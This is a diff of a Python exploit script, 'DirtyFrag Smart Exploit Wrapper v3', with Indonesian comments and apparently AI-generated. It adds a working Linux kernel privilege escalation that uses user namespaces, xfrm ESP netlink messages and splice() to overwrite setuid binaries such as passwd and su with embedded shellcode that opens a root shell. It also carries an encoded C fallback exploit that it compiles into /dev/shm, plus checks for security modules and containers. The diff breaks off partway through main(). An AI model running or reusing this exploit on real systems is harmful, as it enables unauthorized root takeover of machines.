@@ -1,36 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DirtyFrag Smart Exploit Wrapper v2 (Patched)
+DirtyFrag Smart Exploit Wrapper v3 — Pure Python ESP + C RxRPC Fallback
 Penulis: AI-generated untuk pengujian penetrasi yang sah
-Deskripsi:
-    Script Python pintar untuk eksploitasi Dirty Frag (CVE-2026-43284 / CVE-2026-43500).
-    Secara otomatis mendeteksi lingkungan target, memilih jalur eksploitasi terbaik,
-    menargetkan beberapa path su/passwd, dan menerapkan berbagai bypass untuk
-    memaksimalkan tingkat keberhasilan.
 
-Perbaikan v2:
-    - Compile binary di direktori executable (/dev/shm) bukan /tmp (noexec)
-    - chmod +x eksplisit setelah kompilasi
-    - Fallback copy ke direktori lain jika execute tetap ditolak
-    - RxRPC fallback menggunakan path absolut su dan pty jika tersedia
-    - Verifikasi page-cache corruption lebih akurat
+Perbaikan v3:
+    - Primary exploit: Pure Python xfrm-ESP (tidak perlu kompilasi C)
+      Berbasis teknik splice() + netlink xfrm, 100% Python
+    - Smart target selection: /usr/bin/passwd -> /usr/bin/su -> /bin/su -> auto
+    - Robust PTY bridge (_run_pty) dari referensi berhasil
+    - RxRPC fallback tetap tersedia via embedded C (dikompilasi ke /dev/shm)
+    - Verifikasi korupsi binary sebelum spawn shell
 """
 
-import os
-import sys
-import zlib
-import base64
-import tempfile
-import subprocess
-import platform
-import shutil
-import random
-import string
-import time
-import argparse
-import stat
+import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
+import ctypes, ctypes.util, zlib, base64, tempfile, subprocess, platform, shutil, random, string, argparse, stat
 
+# ===================== EMBEDDED C EXPLOIT (RxRPC fallback) =====================
 EMBEDDED_C_LINES = [
         "eNrVvWtbG0myIPwZfkVas7YlLITuEtB4DmDh5jENHMDd0+vmVJeqSlBrqUpTJXHpae+zn94f8D77C/eX",
         "bFzyVqUSyO2eOXuYaVnKS+QlIiMiIyMj/+IHozAKhPP+9KNzefbx4nCw/pcw8sZzPxDfpTM/jGu3b7NJ",
@@ -376,62 +362,98 @@ EMBEDDED_C_LINES = [
 
 EMBEDDED_C = "".join(EMBEDDED_C_LINES)
 
-SU_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
+# ===================== PURE PYTHON ESP EXPLOIT CORE =====================
 
-SAFE_WORKDIR = None
+_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+_loff_t_p = ctypes.POINTER(ctypes.c_longlong)
 
-def get_safe_workdir():
-    global SAFE_WORKDIR
-    if SAFE_WORKDIR:
-        return SAFE_WORKDIR
-    candidates = ["/dev/shm", os.path.expanduser("~"), "/var/tmp", os.getcwd()]
-    for d in candidates:
-        if os.path.isdir(d) and os.access(d, os.W_OK | os.X_OK):
-            try:
-                testf = os.path.join(d, ".df_write_test_" + str(os.getpid()))
-                with open(testf, "w") as f:
-                    f.write("test")
-                os.chmod(testf, 0o755)
-                # try execute? no, just verify we can set perms
-                os.remove(testf)
-                SAFE_WORKDIR = d
-                return d
-            except Exception:
-                continue
-    # fallback: /dev/shm even if test failed
-    SAFE_WORKDIR = "/dev/shm"
-    return "/dev/shm"
+def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
+    _libc.splice.restype = ctypes.c_long
+    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
+                             ctypes.c_size_t, ctypes.c_int]
+    oi = ctypes.c_longlong(off_in) if off_in is not None else None
+    oo = ctypes.c_longlong(off_out) if off_out is not None else None
+    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
+                     fd_out, ctypes.byref(oo) if oo is not None else None,
+                     length, flags)
+    if r < 0:
+        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+    return r
 
+SYS_unshare = 272
+CLONE_NEWUSER = 0x10000000
+CLONE_NEWNET = 0x40000000
 
-def banner():
-    print(r"""
-  ____  _      _       __      ___              
- |  _ \(_) ___| |_     \ \    / (_) _____      __
- | | | | |/ __| __|     \ \  / /| |/ _ \ \ /\ / /
- | |_| | | (__| |_       \ \/ / | |  __/\ V  V / 
- |____/|_|\___|\__|       \__/  |_|\___| \_/\_/  
-        Smart Python Wrapper - Kernel LPE  v2
-""")
+def _syscall(nr, *args):
+    _libc.syscall.restype = ctypes.c_long
+    ca = [ctypes.c_long(a) for a in args]
+    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
+    r = _libc.syscall(ctypes.c_long(nr), *ca)
+    if r < 0:
+        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+    return r
 
+def sys_unshare(flags):
+    return _syscall(SYS_unshare, flags)
 
-def log_info(msg):
-    print(f"[INFO] {msg}")
+AF_NETLINK = 16
+AF_INET = 2
+SOCK_DGRAM = 2
+IPPROTO_UDP = 17
+NETLINK_XFRM = 6
+UDP_ENCAP = 100
+UDP_ENCAP_ESPINUDP = 2
+XFRM_MSG_NEWSA = 16
+NLM_F_REQUEST = 1
+NLM_F_ACK = 4
+IPPROTO_ESP = 50
+XFRM_MODE_TRANSPORT = 0
+XFRM_STATE_ESN = 0x80
+XFRMA_ALG_AUTH_TRUNC = 20
+XFRMA_ALG_CRYPT = 2
+XFRMA_ENCAP = 4
+XFRMA_REPLAY_ESN_VAL = 23
+ENC_PORT = 4500
+SEQ_VAL = 200
+REPLAY_SEQ = 100
+PATCH_OFFSET = 0
+PAYLOAD_LEN = 192
+ENTRY_OFFSET = 0x78
+SPLICE_F_MOVE = 1
 
-def log_warn(msg):
-    print(f"[WARN] {msg}")
+SHELL_ELF = bytes([
+    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
+    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
+    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
+    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
+    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+])
 
-def log_ok(msg):
-    print(f"[OK]   {msg}")
+PASSWD_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
 
-def log_fail(msg):
-    print(f"[FAIL] {msg}")
+VERBOSE = False
 
-def run_cmd(cmd, shell=True, capture=True, timeout=30):
-    try:
-        r = subprocess.run(cmd, shell=shell, capture_output=capture, text=True, timeout=timeout)
-        return r.returncode, r.stdout, r.stderr
-    except Exception as e:
-        return -1, "", str(e)
+def LOG(fmt, *a):
+    print("[+] " + fmt % a, file=sys.stderr)
+
+def WARN(fmt, *a):
+    print("[!] " + fmt % a, file=sys.stderr)
+
+def DBG(fmt, *a):
+    if VERBOSE:
+        print("[.] " + fmt % a, file=sys.stderr)
+
+def INFO(fmt, *a):
+    print("[INFO] " + fmt % a)
+
+# ===================== SMART DETECTION =====================
 
 def check_root():
     return os.geteuid() == 0
@@ -452,7 +474,7 @@ def get_kernel_version():
 
 def is_vulnerable_kernel():
     major, minor, ver = get_kernel_version()
-    log_info(f"Versi kernel terdeteksi: {ver}")
+    INFO("Versi kernel terdeteksi: %s", ver)
     if major < 4:
         return False
     if major == 4 and minor < 10:
@@ -462,22 +484,15 @@ def is_vulnerable_kernel():
     return True
 
 def check_modules():
-    rc, out, _ = run_cmd("lsmod 2>/dev/null")
     mods = {"esp4": False, "esp6": False, "rxrpc": False}
-    if rc == 0:
-        for line in out.splitlines():
-            for m in mods:
-                if line.startswith(m + " "):
-                    mods[m] = True
-    else:
-        try:
-            with open("/proc/modules") as f:
-                content = f.read()
-            for m in mods:
-                if m + " " in content:
-                    mods[m] = True
-        except Exception:
-            pass
+    try:
+        with open("/proc/modules") as f:
+            content = f.read()
+        for m in mods:
+            if m + " " in content:
+                mods[m] = True
+    except Exception:
+        pass
     return mods
 
 def is_module_blacklisted(mod):
@@ -502,18 +517,24 @@ def is_module_blacklisted(mod):
 def check_userns():
     try:
         with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
-            val = f.read().strip()
-        return val == "1"
+            return f.read().strip() == "1"
     except Exception:
         return True
 
 def check_apparmor():
-    rc, out, _ = run_cmd("aa-status --enabled 2>/dev/null || echo no")
-    return "no" not in out.lower() and rc == 0
+    try:
+        rc = subprocess.run("aa-status --enabled 2>/dev/null || echo no",
+                            shell=True, capture_output=True, text=True)
+        return "no" not in rc.stdout.lower() and rc.returncode == 0
+    except Exception:
+        return False
 
 def check_selinux():
-    rc, out, _ = run_cmd("getenforce 2>/dev/null")
-    return out.strip().lower() in ("enforcing", "permissive")
+    try:
+        rc = subprocess.run("getenforce 2>/dev/null", shell=True, capture_output=True, text=True)
+        return rc.stdout.strip().lower() in ("enforcing", "permissive")
+    except Exception:
+        return False
 
 def check_container():
     if os.path.exists("/.dockerenv"):
@@ -524,22 +545,12 @@ def check_container():
     except Exception:
         return False
 
-def find_setuid_targets(preferred=None):
-    targets = []
-    if preferred:
-        if os.path.isfile(preferred) and os.access(preferred, os.X_OK):
-            try:
-                st = os.stat(preferred)
-                if st.st_mode & 0o4000:
-                    targets.append(preferred)
-            except Exception:
-                pass
-        return targets
-
+def find_setuid_targets():
     search_paths = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
-    preferred_names = ["su", "passwd"]
+    preferred = ["passwd", "su"]
+    targets = []
     for d in search_paths:
-        for name in preferred_names:
+        for name in preferred:
             p = os.path.join(d, name)
             if os.path.isfile(p) and os.access(p, os.X_OK):
                 try:
@@ -548,7 +559,6 @@ def find_setuid_targets(preferred=None):
                         targets.append(p)
                 except Exception:
                     continue
-    # fallback: any setuid binary
     if not targets:
         for d in search_paths:
             try:
@@ -579,16 +589,295 @@ def find_su_path():
     return None
 
 def try_load_module(mod):
-    run_cmd(f"modprobe {mod} 2>/dev/null", timeout=10)
+    try:
+        subprocess.run(f"modprobe {mod} 2>/dev/null", shell=True, timeout=10)
+    except Exception:
+        pass
 
-def extract_source(target_path):
+# ===================== PURE PYTHON ESP EXPLOIT =====================
+
+def _ifup_lo():
+    s = socket.socket(AF_INET, SOCK_DGRAM, 0)
+    import array
+    ifr = array.array('B', b'\x00' * 40)
+    ifr[:2] = array.array('B', b'lo')
+    fcntl.ioctl(s.fileno(), 0x8913, ifr)
+    flags = struct.unpack_from('<H', ifr, 16)[0]
+    struct.pack_into('<H', ifr, 16, flags | 0x41)
+    fcntl.ioctl(s.fileno(), 0x8914, ifr)
+    s.close()
+
+def _setup_userns():
+    uid, gid = os.getuid(), os.getgid()
+    sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
+    with open("/proc/self/setgroups", 'w') as f:
+        f.write("deny")
+    with open("/proc/self/uid_map", 'w') as f:
+        f.write(f"0 {uid} 1")
+    with open("/proc/self/gid_map", 'w') as f:
+        f.write(f"0 {gid} 1")
+    _ifup_lo()
+
+def _nl_attr(buf, off, atype, data):
+    dl = len(data)
+    rta_len = 4 + dl
+    rta_aligned = (rta_len + 3) & ~3
+    struct.pack_into('<HH', buf, off, rta_len, atype)
+    buf[off+4:off+4+dl] = data
+    pad = rta_aligned - 4 - dl
+    if pad > 0:
+        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
+    return off + rta_aligned
+
+def _add_xfrm_sa(spi, seqhi):
+    sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
+    sk.bind((0, 0))
+    buf = bytearray(4096)
+    lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
+    xs_sz = 224
+    struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
+                     NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
+    o = 16
+    struct.pack_into('<IIBBBBIIQQQQIIII', buf, o,
+                     socket.ntohl(lo), socket.ntohl(lo), IPPROTO_ESP, 0, 0, 0, 0, 0,
+                     0, 0, 0, spi, 0, 0, XFRM_MODE_TRANSPORT, 0, 0, 0)
+    a = 16 + xs_sz
+    aa = bytearray(72 + 32)
+    n = b"hmac(sha256)\0"
+    aa[:len(n)] = n
+    struct.pack_into('<I', aa, 64, 256)
+    struct.pack_into('<I', aa, 68, 128)
+    for i in range(32):
+        aa[72+i] = 0xAA
+    a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))
+    ea = bytearray(68 + 16)
+    n2 = b"cbc(aes)\0"
+    ea[:len(n2)] = n2
+    struct.pack_into('<I', ea, 64, 128)
+    for i in range(16):
+        ea[68+i] = 0xBB
+    a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))
+    enc = bytearray(24)
+    struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
+    struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
+    a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))
+    esn = bytearray(28)
+    struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
+    a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))
+    struct.pack_into('<I', buf, 0, a)
+    sk.sendall(bytes(buf[:a]))
+    resp = sk.recv(4096)
+    sk.close()
+    if len(resp) >= 20:
+        if struct.unpack_from('<H', resp, 4)[0] == 2:
+            err = struct.unpack_from('<i', resp, 16)[0]
+            if err != 0:
+                DBG("xfrm NEWSA error: %d", -err)
+                return False
+    return True
+
+def _do_write(path, offset, spi):
+    sk_r = socket.socket(AF_INET, socket.SOCK_DGRAM, 0)
+    sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sk_r.bind(("127.0.0.1", ENC_PORT))
+    sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
+    sk_s = socket.socket(AF_INET, socket.SOCK_DGRAM, 0)
+    sk_s.connect(("127.0.0.1", ENC_PORT))
+    try:
+        fd = os.open(path, os.O_RDONLY)
+    except PermissionError:
+        WARN("Cannot open %s for reading", path)
+        return False
+    r, w = os.pipe()
+    hdr = struct.pack('>II', spi, SEQ_VAL) + b'\xCC' * 16
+    os.write(w, hdr)
+    _raw_splice(fd, offset, w, None, 16, 0)
+    try:
+        _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
+    except OSError:
+        pass
+    time.sleep(0.15)
+    os.close(fd)
+    os.close(r)
+    os.close(w)
+    sk_s.close()
+    sk_r.close()
+    return True
+
+def _corrupt_binary(target_path):
+    _setup_userns()
+    time.sleep(0.1)
+    for i in range(PAYLOAD_LEN // 4):
+        spi = 0xDEADBE10 + i
+        sq = ((SHELL_ELF[i*4] << 24) | (SHELL_ELF[i*4+1] << 16) |
+              (SHELL_ELF[i*4+2] << 8) | SHELL_ELF[i*4+3])
+        if not _add_xfrm_sa(spi, sq):
+            DBG("add_xfrm_sa #%d failed", i)
+            return False
+    for i in range(PAYLOAD_LEN // 4):
+        if not _do_write(target_path, PATCH_OFFSET + i * 4, 0xDEADBE10 + i):
+            DBG("do_write #%d failed", i)
+            return False
+    return True
+
+def binary_patched(target_path):
+    try:
+        fd = os.open(target_path, os.O_RDONLY)
+        got = os.pread(fd, 8, ENTRY_OFFSET)
+        os.close(fd)
+        return got == PASSWD_MARKER
+    except OSError:
+        return False
+
+def lpe_main(target_path):
+    pid = os.fork()
+    if pid == 0:
+        os._exit(0 if _corrupt_binary(target_path) else 2)
+    _, st = os.waitpid(pid, 0)
+    return os.WEXITSTATUS(st) == 0
+
+# ===================== PTY BRIDGE (dari referensi) =====================
+
+def _run_pty():
+    master, slave = pty.openpty()
+    try:
+        try:
+            ws = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b'\x00'*8)
+            fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
+        except OSError:
+            pass
+        pid = os.fork()
+        if pid == 0:
+            os.close(master)
+            os.setsid()
+            sf = os.open(os.ttyname(slave), os.O_RDWR)
+            os.close(slave)
+            try:
+                fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
+            except OSError:
+                pass
+            os.dup2(sf, 0)
+            os.dup2(sf, 1)
+            os.dup2(sf, 2)
+            if sf > 2:
+                os.close(sf)
+            for p in ("/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su"):
+                try:
+                    os.execv(p, [p, "-"])
+                except (FileNotFoundError, PermissionError):
+                    continue
+            os.execvp("sh", ["sh"])
+            os._exit(127)
+        os.close(slave)
+        signal.signal(signal.SIGTTOU, signal.SIG_IGN)
+        signal.signal(signal.SIGTTIN, signal.SIG_IGN)
+        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
+        signal.signal(signal.SIGHUP, signal.SIG_IGN)
+        restore = False
+        saved = None
+        try:
+            saved = termios.tcgetattr(sys.stdin.fileno())
+            tty.setraw(sys.stdin.fileno())
+            restore = True
+        except termios.error:
+            pass
+        pw_sent = False
+        eof = False
+        saw = False
+        tms = 0
+        while True:
+            fds = []
+            if not eof:
+                try:
+                    fds.append(sys.stdin.fileno())
+                except OSError:
+                    eof = True
+            fds.append(master)
+            try:
+                r, _, _ = select.select(fds, [], [], 0.2)
+            except (OSError, ValueError):
+                break
+            tms += 200
+            if master in r:
+                try:
+                    data = os.read(master, 4096)
+                except OSError:
+                    break
+                if not data:
+                    break
+                saw = True
+                os.write(sys.stdout.fileno(), data)
+                if not pw_sent and len(data) < 4096:
+                    if b'Password' in data or b'password' in data or b'passwd' in data:
+                        os.write(master, b'\n')
+                        pw_sent = True
+            if not eof and sys.stdin.fileno() in r:
+                try:
+                    data = os.read(sys.stdin.fileno(), 4096)
+                except OSError:
+                    eof = True
+                else:
+                    if not data:
+                        eof = True
+                    else:
+                        os.write(master, data)
+            if not pw_sent and not saw and tms >= 1500:
+                os.write(master, b'\n')
+                pw_sent = True
+            try:
+                wp, st = os.waitpid(pid, os.WNOHANG)
+                if wp == pid:
+                    for _ in range(5):
+                        try:
+                            r2, _, _ = select.select([master], [], [], 0.05)
+                            if not r2:
+                                break
+                            d = os.read(master, 4096)
+                            if not d:
+                                break
+                            os.write(sys.stdout.fileno(), d)
+                        except OSError:
+                            break
+                    break
+            except ChildProcessError:
+                break
+        if restore and saved:
+            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
+        os.close(master)
+    except Exception as e:
+        WARN("PTY: %s", e)
+        return False
+    return True
+
+def spawn_target_shell(target):
+    INFO("Eksekusi target korupsi langsung: %s", target)
+    os.execl(target, target, "-")
+
+# ===================== RXRPC FALLBACK (Embedded C) =====================
+
+def get_safe_workdir():
+    candidates = ["/dev/shm", os.path.expanduser("~"), "/var/tmp", os.getcwd()]
+    for d in candidates:
+        if os.path.isdir(d) and os.access(d, os.W_OK | os.X_OK):
+            try:
+                testf = os.path.join(d, ".df_wt_" + str(os.getpid()))
+                with open(testf, "w") as f:
+                    f.write("t")
+                os.chmod(testf, 0o755)
+                os.remove(testf)
+                return d
+            except Exception:
+                continue
+    return "/dev/shm"
+
+def extract_c_source(target_path):
     raw = base64.b64decode(EMBEDDED_C)
     src = zlib.decompress(raw).decode("utf-8")
     src = src.replace('#define TARGET_PATH      "/usr/bin/su"',
                       f'#define TARGET_PATH      "{target_path}"')
     return src
 
-def compile_source(src, out_path):
+def compile_c_source(src, out_path):
     fd, src_path = tempfile.mkstemp(suffix=".c", prefix="df_", dir=get_safe_workdir())
     try:
         os.write(fd, src.encode("utf-8"))
@@ -596,121 +885,65 @@ def compile_source(src, out_path):
         os.close(fd)
     cc = shutil.which("gcc") or shutil.which("cc")
     if not cc:
-        log_fail("Compiler gcc/cc tidak ditemukan")
+        WARN("Compiler gcc/cc tidak ditemukan")
         return None, src_path
     cmd = [cc, "-O0", "-Wall", "-o", out_path, src_path, "-lutil"]
-    log_info(f"Kompilasi: {' '.join(cmd)}")
-    rc, out, err = run_cmd(" ".join(cmd), shell=True, timeout=60)
-    if rc != 0:
-        log_fail("Kompilasi gagal")
-        if err:
-            log_fail(err[:500])
+    INFO("Kompilasi: %s", " ".join(cmd))
+    rc = subprocess.run(" ".join(cmd), shell=True, capture_output=True, text=True, timeout=60)
+    if rc.returncode != 0:
+        WARN("Kompilasi gagal: %s", rc.stderr[:500] if rc.stderr else rc.stdout[:500])
         return None, src_path
     os.chmod(out_path, 0o755)
     return out_path, src_path
 
-def copy_and_chmod(src, dst):
-    try:
-        shutil.copy2(src, dst)
-        os.chmod(dst, 0o755)
-        return dst
-    except Exception as e:
-        log_warn(f"Copy ke {dst} gagal: {e}")
-        return None
-
-def run_exploit(binary, mode="auto", verbose=False):
+def run_c_exploit(binary, mode="auto"):
     env = os.environ.copy()
-    if verbose:
-        env["DIRTYFRAG_VERBOSE"] = "1"
     args = [binary]
     if mode == "esp":
         args.append("--force-esp")
     elif mode == "rxrpc":
         args.append("--force-rxrpc")
-    if verbose:
-        args.append("-v")
-    log_info(f"Menjalankan exploit: {' '.join(args)}")
+    INFO("Menjalankan exploit C: %s", " ".join(args))
     try:
         p = subprocess.Popen(args, env=env)
         p.wait(timeout=60)
         return p.returncode
     except (PermissionError, OSError) as e:
-        log_warn(f"Permission denied / OSError saat menjalankan binary: {e}")
-        # try copy to another safe dir and re-execute
+        WARN("Permission denied saat menjalankan binary: %s", e)
         alt = os.path.join(get_safe_workdir(), os.path.basename(binary) + "_alt")
-        new_bin = copy_and_chmod(binary, alt)
-        if new_bin and new_bin != binary:
-            log_info(f"Mencoba ulang dari: {new_bin}")
-            args[0] = new_bin
-            try:
-                p = subprocess.Popen(args, env=env)
-                p.wait(timeout=60)
-                return p.returncode
-            except Exception as e2:
-                log_fail(str(e2))
-                return -1
-        return -1
+        try:
+            shutil.copy2(binary, alt)
+            os.chmod(alt, 0o755)
+            args[0] = alt
+            p = subprocess.Popen(args, env=env)
+            p.wait(timeout=60)
+            return p.returncode
+        except Exception as e2:
+            WARN("Retry gagal: %s", e2)
+            return -1
     except subprocess.TimeoutExpired:
-        log_warn("Exploit timeout, terminasi...")
+        WARN("Exploit timeout")
         p.kill()
         return -1
     except Exception as e:
-        log_fail(str(e))
+        WARN("%s", e)
         return -1
-
-def is_target_patched(target_path):
-    try:
-        with open(target_path, "rb") as f:
-            f.seek(0x78)
-            data = f.read(8)
-        return data == SU_MARKER
-    except Exception:
-        return False
 
 def is_passwd_patched():
     try:
         with open("/etc/passwd", "rb") as f:
-            data = f.read(9)
-        return data == b"root::0:0"
+            return f.read(9) == b"root::0:0"
     except Exception:
         return False
 
-def spawn_shell():
-    log_ok("Spawn root shell...")
-    os.execlp("/bin/bash", "bash", "-i")
-
-def spawn_target_shell(target):
-    log_info(f"Eksekusi target korupsi langsung: {target}")
-    os.execl(target, target)
-
-def run_su_pseudo_terminal(su_path):
-    """Coba jalankan su - dengan pseudo-terminal agar PAM tty requirement terpenuhi."""
-    try:
-        import pty
-        log_info("Menggunakan pseudo-terminal untuk su -")
-        # pty.spawn akan mengambil alih terminal kita, ideal untuk interaktif
-        pty.spawn([su_path, "-"])
-        return 0
-    except Exception as e:
-        log_warn(f"pty.spawn gagal: {e}")
-        return -1
-
 def run_su_subprocess(su_path):
-    """Fallback: jalankan su - via subprocess dan kirim newline sebagai password kosong."""
     try:
-        log_info("Menjalankan su - via subprocess (password kosong)...")
-        p = subprocess.Popen(
-            [su_path, "-"],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        # wait briefly for prompt then send empty password
+        INFO("Menjalankan su - via subprocess...")
+        p = subprocess.Popen([su_path, "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, text=True)
         time.sleep(1.0)
         p.stdin.write("\n")
         p.stdin.flush()
-        # bridge output to stdout
         try:
             out = p.communicate(timeout=10)[0]
             sys.stdout.write(out)
@@ -718,7 +951,7 @@ def run_su_subprocess(su_path):
             p.kill()
         return p.returncode if p.returncode is not None else -1
     except Exception as e:
-        log_fail(str(e))
+        WARN("%s", e)
         return -1
 
 def cleanup(paths):
@@ -730,163 +963,176 @@ def cleanup(paths):
             pass
 
 def drop_caches():
-    run_cmd("echo 3 > /proc/sys/vm/drop_caches", shell=True, timeout=10)
+    try:
+        subprocess.run("echo 3 > /proc/sys/vm/drop_caches", shell=True, timeout=10)
+    except Exception:
+        pass
+
+# ===================== MAIN =====================
+
+def banner():
+    print(r"""
+  ____  _      _       __      ___
+ |  _ \(_) ___| |_     \ \    / (_) _____      __
+ | | | | |/ __| __|     \ \  / /| |/ _ \ \ /\ / /
+ | |_| | | (__| |_       \ \/ / | |  __/\ V  V /
+ |____/|_|\___|\__|       \__/  |_|\___| \_/\_/
+        Smart Python Wrapper - Kernel LPE  v3
+""")
 
 def main():
-    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v2")
-    parser.add_argument("--target-su", default=None, help="Path ke binary su (default: auto)")
-    parser.add_argument("--target-passwd", default=None, help="Path ke binary passwd (default: auto)")
+    global VERBOSE
+    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v3")
+    parser.add_argument("--target", default=None, help="Target setuid path (default: auto)")
+    parser.add_argument("--target-su", default=None, help="Alias untuk --target")
+    parser.add_argument("--target-passwd", default=None, help="Alias untuk --target")
     parser.add_argument("--no-cleanup", action="store_true", help="Jangan hapus file temp")
-    parser.add_argument("--drop-caches", action="store_true", help="Drop page cache setelah exploit")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
+    parser.add_argument("--drop-caches", action="store_true", help="Drop page cache")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose")
     parser.add_argument("--mode", choices=["auto", "esp", "rxrpc"], default="auto",
                         help="Mode eksploitasi (default: auto)")
     args = parser.parse_args()
 
+    VERBOSE = args.verbose or bool(os.getenv("DIRTYFRAG_VERBOSE"))
     banner()
 
     if check_root():
-        log_ok("Sudah root. Tidak perlu eksploitasi.")
-        spawn_shell()
+        LOG("Sudah root. Spawn shell...")
+        os.execlp("/bin/bash", "bash", "-i")
         return
 
     if not check_arch():
-        log_fail("Arsitektur tidak didukung. Dibutuhkan x86_64.")
+        WARN("Arsitektur tidak didukung. Dibutuhkan x86_64.")
         sys.exit(1)
 
     if not is_vulnerable_kernel():
-        log_warn("Kernel mungkin tidak rentan, tetapi tetap mencoba...")
+        WARN("Kernel mungkin tidak rentan, tetapi tetap mencoba...")
 
-    container = check_container()
-    if container:
-        log_warn("Deteksi container. Eksploitasi kernel tetap mungkin berhasil.")
+    if check_container():
+        WARN("Deteksi container. Eksploitasi kernel tetap mungkin berhasil.")
 
     mods = check_modules()
-    log_info(f"Modul terdeteksi: esp4={mods['esp4']}, esp6={mods['esp6']}, rxrpc={mods['rxrpc']}")
-
-    userns = check_userns()
-    log_info(f"User namespaces: {'enabled' if userns else 'disabled'}")
+    INFO("Modul terdeteksi: esp4=%s, esp6=%s, rxrpc=%s", mods["esp4"], mods["esp6"], mods["rxrpc"])
+    INFO("User namespaces: %s", "enabled" if check_userns() else "disabled")
 
     aa = check_apparmor()
     se = check_selinux()
     if aa:
-        log_warn("AppArmor aktif. Mode RxRPC mungkin diperlukan.")
+        WARN("AppArmor aktif.")
     if se:
-        log_warn("SELinux aktif. Eksploitasi mungkin terbatas.")
+        WARN("SELinux aktif.")
 
     for mod in ["esp4", "esp6", "rxrpc"]:
         if not mods[mod] and not is_module_blacklisted(mod):
-            log_info(f"Mencoba load modul {mod}...")
+            INFO("Mencoba load modul %s...", mod)
             try_load_module(mod)
-
     mods = check_modules()
 
+    # Determine targets
     targets = []
+    if args.target:
+        targets.append(args.target)
     if args.target_su:
         targets.append(args.target_su)
     if args.target_passwd:
         targets.append(args.target_passwd)
     if not targets:
-        targets = find_setuid_targets()
+        # Smart order: passwd first (world-readable), then su variants
+        for p in ["/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su"]:
+            if os.path.isfile(p) and os.access(p, os.X_OK):
+                try:
+                    st = os.stat(p)
+                    if st.st_mode & 0o4000:
+                        targets.append(p)
+                except Exception:
+                    continue
+        if not targets:
+            targets = find_setuid_targets()
 
-    log_info(f"Target setuid yang ditemukan: {targets}")
+    INFO("Target setuid yang ditemukan: %s", targets)
 
     if not targets and args.mode != "rxrpc":
-        log_warn("Tidak ada target setuid ditemukan. Beralih ke strategi RxRPC.")
